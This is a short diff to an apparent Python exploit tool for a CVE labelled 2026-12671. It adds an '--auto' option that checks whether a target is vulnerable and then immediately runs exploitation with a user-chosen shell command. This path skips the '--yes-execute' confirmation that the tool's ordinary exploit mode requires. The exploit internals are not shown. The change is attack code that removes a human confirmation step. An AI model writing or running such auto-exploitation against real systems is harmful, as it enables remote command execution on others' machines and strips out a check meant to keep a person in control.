@@ -369,6 +369,8 @@ def main():
                         help='Detection mode only (safe, no exploitation)')
     parser.add_argument('--exploit', action='store_true',
                         help='Enable exploitation mode (requires --yes-execute)')
+    parser.add_argument('--auto', action='store_true',
+                        help='Auto-exploit if vulnerable (auto-escalate)')
     parser.add_argument('--command', default='id',
                         help='Shell command to execute (default: id)')
     parser.add_argument('--yes-execute', action='store_true',
@@ -404,6 +406,22 @@ def main():
         sys.exit(1)
 
     exploit = CVE202612671Exploit(args.target, args.session_path, args.command)
+
+    # Auto-exploit if vulnerable
+    if args.auto:
+        print("[!] AUTO MODE: Detecting then exploiting if vulnerable...")
+        result = exploit.detect_vulnerable()
+        if result['vulnerable']:
+            print("[+] Target is VULNERABLE - Auto-escalating!")
+            print(f"[!] Running: {args.command}")
+            success = exploit.exploit()
+            if success:
+                print("[+] Auto-exploitation successful!")
+            else:
+                print("[-] Auto-exploitation failed")
+        else:
+            print("[+] Target does not appear vulnerable - skipping exploitation")
+        return
 
     if args.check_only:
         print("[*] Running detection (check-only mode)...")
